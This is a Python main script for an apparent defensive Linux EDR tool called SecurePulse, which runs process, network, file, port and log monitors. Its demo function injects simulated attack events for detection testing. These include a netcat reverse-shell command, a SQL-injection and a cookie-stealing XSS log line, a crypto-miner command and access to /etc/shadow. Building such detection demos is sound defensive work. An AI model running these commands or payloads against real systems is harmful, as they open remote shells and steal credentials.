#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   SecurePulse (EDR) — Intelligent Endpoint Detection &       ║
║   Response System                                            ║
║   Version: 1.0.0 | Python 3 | Linux                         ║
╚══════════════════════════════════════════════════════════════╝

Usage:
    python main.py [mode]

Modes:
    full        Run all monitors simultaneously (default)
    process     Process monitor only
    network     Network monitor only
    file        File monitor only
    ports       Port scanner only
    logs        Log analyzer only
    dashboard   Launch web dashboard only
    demo        Run demo scan with simulated detections
    once        Single-pass scan (no continuous loop)
"""

import argparse
import logging
import os
import sys
import threading
import time

# ── Make imports work from any working directory ──────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import yaml

from vigilcore.core.alert_manager   import AlertManager
from vigilcore.core.detection_engine import DetectionEngine
from vigilcore.agent.process_monitor import ProcessMonitor
from vigilcore.agent.file_monitor    import FileMonitor
from vigilcore.agent.network_monitor import NetworkMonitor
from vigilcore.agent.port_scanner    import PortScanner
from vigilcore.analyzer.log_analyzer import LogAnalyzer

# ── Logging setup ─────────────────────────────────────────────────────────────
os.makedirs("vigilcore/logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler("vigilcore/logs/securepulse.log"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("SecurePulse")

# ── Load config ───────────────────────────────────────────────────────────────
_CFG_PATH = os.path.join(os.path.dirname(__file__), "vigilcore", "config", "config.yaml")
try:
    with open(_CFG_PATH) as f:
        CONFIG = yaml.safe_load(f) or {}
except FileNotFoundError:
    CONFIG = {}
    logger.warning("config.yaml not found — using defaults.")


def _cfg(path: str, default=None):
    """Dot-path accessor for nested config."""
    keys  = path.split(".")
    value = CONFIG
    for k in keys:
        if not isinstance(value, dict):
            return default
        value = value.get(k, default)
    return value


# ─── Banner ───────────────────────────────────────────────────────────────────
BANNER = r"""
  ____                          ____        _          
 / ___|  ___  ___ _   _ _ __  |  _ \ _   _| |___  ___ 
 \___ \ / _ \/ __| | | | '__| | |_) | | | | / __|/ _ \
  ___) |  __/ (__| |_| | |    |  __/| |_| | \__ \  __/
 |____/ \___|\___|\__,_|_|    |_|    \__,_|_|___/\___|
                                                        
       EDR — Intelligent Endpoint Detection & Response
       Version 1.0.0 | Defensive Security | Linux
"""


def print_banner():
    try:
        from rich.console import Console
        from rich.text import Text
        c = Console()
        c.print(Text(BANNER, style="bold cyan"))
    except ImportError:
        print(BANNER)


# ─── Component factory ────────────────────────────────────────────────────────
def build_components():
    """Instantiate all EDR components and return them."""
    alert_log = _cfg("system.alert_log", "vigilcore/logs/alerts.json")
    am = AlertManager(alert_log_path=alert_log)
    de = DetectionEngine(alert_manager=am)

    # Agents
    pm = ProcessMonitor(
        detection_engine=de,
        interval=_cfg("monitoring.process.interval", 5),
    )
    fm = FileMonitor(
        detection_engine=de,
        watch_paths=_cfg("monitoring.file.watch_paths", ["/tmp", "/home"]),
        interval=_cfg("monitoring.file.interval", 2),
    )
    nm = NetworkMonitor(
        detection_engine=de,
        interval=_cfg("monitoring.network.interval", 10),
    )
    ps = PortScanner(
        detection_engine=de,
        target=_cfg("monitoring.port_scanner.target", "127.0.0.1"),
        port_range=tuple(_cfg("monitoring.port_scanner.port_range", [1, 1024])),
        interval=_cfg("monitoring.port_scanner.interval", 60),
    )
    la = LogAnalyzer(
        detection_engine=de,
        log_files=_cfg("monitoring.log_analyzer.log_files", ["/var/log/auth.log"]),
        interval=_cfg("monitoring.log_analyzer.interval", 30),
    )
    return am, de, pm, fm, nm, ps, la


# ─── Modes ────────────────────────────────────────────────────────────────────
def run_full():
    """Launch all monitors in separate threads."""
    am, de, pm, fm, nm, ps, la = build_components()
    print_banner()
    logger.info("Starting SecurePulse EDR — FULL mode")

    threads = []

    if _cfg("monitoring.process.enabled", True):
        t = threading.Thread(target=pm.run_continuous, name="ProcessMonitor", daemon=True)
        threads.append(t)

    if _cfg("monitoring.network.enabled", True):
        t = threading.Thread(target=nm.run_continuous, name="NetworkMonitor", daemon=True)
        threads.append(t)

    if _cfg("monitoring.port_scanner.enabled", True):
        t = threading.Thread(target=ps.run_continuous, name="PortScanner", daemon=True)
        threads.append(t)

    if _cfg("monitoring.log_analyzer.enabled", True):
        t = threading.Thread(target=la.run_continuous, name="LogAnalyzer", daemon=True)
        threads.append(t)

    # File monitor uses watchdog (blocking start)
    if _cfg("monitoring.file.enabled", True):
        fm.start()

    # Optional dashboard
    if _cfg("dashboard.enabled", False):
        try:
            from vigilcore.dashboard.app import app as flask_app
            dash_thread = threading.Thread(
                target=lambda: flask_app.run(
                    host=_cfg("dashboard.host", "0.0.0.0"),
                    port=_cfg("dashboard.port", 5000),
                    debug=False,
                    use_reloader=False,
                ),
                name="Dashboard",
                daemon=True,
            )
            dash_thread.start()
            logger.info("Dashboard available at http://localhost:%d", _cfg("dashboard.port", 5000))
        except Exception as e:
            logger.warning("Dashboard failed to start: %s", e)

    for t in threads:
        t.start()

    logger.info("SecurePulse EDR is RUNNING. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        logger.info("Shutting down SecurePulse EDR …")
        fm.stop()
        am.print_summary_table()
        am.export_json()
        logger.info("Alert log saved to: %s", am.alert_log_path)


def run_once():
    """Single-pass scan of all components."""
    am, de, pm, fm, nm, ps, la = build_components()
    print_banner()
    logger.info("SecurePulse EDR — SINGLE PASS scan")

    print("\n[1/5] Scanning processes …")
    pm.scan_once()

    print("[2/5] Scanning network connections …")
    nm.scan_once()

    print("[3/5] Scanning ports (1–1024) …")
    ps_alerts = ps.run_once_and_analyze()

    print("[4/5] Analyzing logs …")
    la.analyze_all()

    print("[5/5] Scanning watched directories …")
    for path in _cfg("monitoring.file.watch_paths", ["/tmp"]):
        FileMonitor.scan_directory_once(path, de)

    print()
    am.print_summary_table()
    am.export_json()
    logger.info("Scan complete. Alerts exported to: %s", am.alert_log_path)


def run_demo():
    """
    Run a demonstration with injected synthetic events so you can
    see alerts even in a clean lab environment.
    """
    print_banner()
    logger.info("SecurePulse EDR — DEMO mode (synthetic events)")

    am = AlertManager("vigilcore/logs/alerts.json")
    de = DetectionEngine(alert_manager=am)

    print("\n⚙  Injecting synthetic suspicious events …\n")
    time.sleep(0.5)

    # 1. Simulate reverse shell process
    de.analyze_process({
        "pid": 9999, "name": "nc", "username": "www-data",
        "cmdline": ["nc", "-e", "/bin/bash", "192.168.1.10", "4444"],
        "cpu_percent": 1.2, "memory_percent": 0.5,
    })

    # 2. Simulate suspicious port
    de.analyze_network({
        "pid": 8888, "status": "ESTABLISHED",
        "local_address": "0.0.0.0", "local_port": 4444,
        "remote_address": "10.0.0.99", "remote_port": 4444,
    })

    # 3. Simulate ransomware-encrypted file
    de.analyze_file_event({"path": "/home/user/documents/report.wncry", "event_type": "created"})

    # 4. Simulate ransomware bulk behaviour
    de.analyze_ransomware_behavior(file_count=35, time_window=8.0)

    # 5. Simulate script dropped in /tmp
    de.analyze_file_event({"path": "/tmp/backdoor.sh", "event_type": "created"})

    # 6. Simulate sensitive file access
    de.analyze_file_event({"path": "/etc/shadow", "event_type": "modified"})

    # 7. Simulate unexpected open port
    de.analyze_open_port(4444)
    de.analyze_open_port(31337)

    # 8. Simulate SQLi in log
    sqli_line = '192.168.1.55 - - [01/Jan/2025:12:00:01] "GET /login?user=\' OR 1=1-- HTTP/1.1" 200 4523'
    de.analyze_log_line(sqli_line, "/var/log/apache2/access.log")

    # 9. Simulate XSS in log
    xss_line  = '10.0.0.1 - - [01/Jan/2025:12:00:05] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 1234'
    de.analyze_log_line(xss_line, "/var/log/apache2/access.log")

    # 10. Simulate brute force
    for _ in range(6):
        de.analyze_brute_force(6, "203.0.113.45", "/var/log/auth.log")
        break   # only trigger once

    # 11. Simulate crypto miner
    de.analyze_process({
        "pid": 7777, "name": "xmrig", "username": "nobody",
        "cmdline": ["xmrig", "--pool", "xmr.pool.net:3333"],
        "cpu_percent": 98.0, "memory_percent": 2.1,
    })

    print()
    am.print_summary_table()
    am.export_json()
    logger.info("Demo complete. Alerts saved to: %s", am.alert_log_path)
    logger.info("Run 'python main.py dashboard' to view in the web UI.")


def run_dashboard_only():
    """Launch only the Flask dashboard."""
    try:
        from vigilcore.dashboard.app import app as flask_app
        print_banner()
        host  = _cfg("dashboard.host", "0.0.0.0")
        port  = _cfg("dashboard.port", 5000)
        logger.info("Launching dashboard at http://%s:%d", host, port)
        flask_app.run(host=host, port=port, debug=False)
    except ImportError:
        logger.error("Flask not installed. Run: pip install flask")
        sys.exit(1)


def run_single_module(module: str):
    """Run a single monitoring module indefinitely."""
    am, de, pm, fm, nm, ps, la = build_components()
    print_banner()

    module_map = {
        "process": pm.run_continuous,
        "network": nm.run_continuous,
        "file":    fm.run_continuous,
        "ports":   ps.run_continuous,
        "logs":    la.run_continuous,
    }

    fn = module_map.get(module)
    if not fn:
        logger.error("Unknown module: %s", module)
        sys.exit(1)

    logger.info("Starting module: %s", module)
    try:
        fn()
    except KeyboardInterrupt:
        am.print_summary_table()


# ─── CLI ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="SecurePulse EDR — Intelligent Endpoint Detection & Response"
    )
    parser.add_argument(
        "mode",
        nargs="?",
        default="full",
        choices=["full", "once", "demo", "dashboard",
                 "process", "network", "file", "ports", "logs"],
        help="Operating mode (default: full)",
    )
    args = parser.parse_args()

    if args.mode == "full":
        run_full()
    elif args.mode == "once":
        run_once()
    elif args.mode == "demo":
        run_demo()
    elif args.mode == "dashboard":
        run_dashboard_only()
    else:
        run_single_module(args.mode)


if __name__ == "__main__":
    main()
